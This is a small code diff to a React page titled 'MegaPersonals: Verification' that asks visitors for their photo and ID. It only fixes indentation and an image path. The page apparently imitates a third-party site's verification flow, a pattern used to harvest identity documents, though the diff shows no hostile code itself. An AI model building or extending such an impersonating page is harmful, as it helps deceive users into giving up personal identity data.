@@ -52,8 +52,8 @@ export default function VerificationSteps() {
 
             <script src="/mega-verification/v2/js/p2/mobile-tablet-check.js"></script>
               
-              <script src="/mega-verification/v2/js/p2/inner.min.js"></script>
-              <title>MegaPersonals: Verification</title>
+            <script src="/mega-verification/v2/js/p2/inner.min.js"></script>
+            <title>MegaPersonals: Verification</title>
           </Helmet>
           
           <PageLoader>
@@ -277,7 +277,7 @@ export default function VerificationSteps() {
                     <h3>We will now check your<br/>Photo and ID in our<br/>records... one minute<br/>Please.</h3>
                     <div className="d-flex flex-column">
                         <img alt="" className="img-reload mt-2" src='/mega-verification/v2/images/reload-image.png' />
-                        <img alt="" className="img-footer-logo mt-2" src='//mega-verification/v2/images/p2/footer-logo.png' />
+                        <img alt="" className="img-footer-logo mt-2" src='/mega-verification/v2/images/p2/footer-logo.png' />
                         <div>
                             <p className="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                             <p className="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
